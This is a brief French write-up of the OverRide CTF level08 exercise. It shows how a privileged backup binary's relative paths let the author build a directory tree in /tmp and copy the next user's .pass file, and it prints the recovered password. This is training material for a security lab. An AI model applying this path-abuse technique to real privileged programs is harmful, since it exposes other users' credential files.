# Override
Override 42 security level08

On remarque que le f'executable prend un path en argument.

```
level08@OverRide:~$ ./level08 backups/.log
ERROR: Failed to open ./backups/backups/.log
```

Après l'avoir traduit, on se rend vite compte de la vulnérabilité : les paths sont écrits en "dur" et les chemins sont donc relatifs.
On peut donc choisir où le fichier sera créé.

```
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p ./backups/home/users/level09/
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass # On lance l'executable avec le fichier que l'on souhaite ouvrir
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass # On ouvre la backup créée
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
Merci pour le drapeau
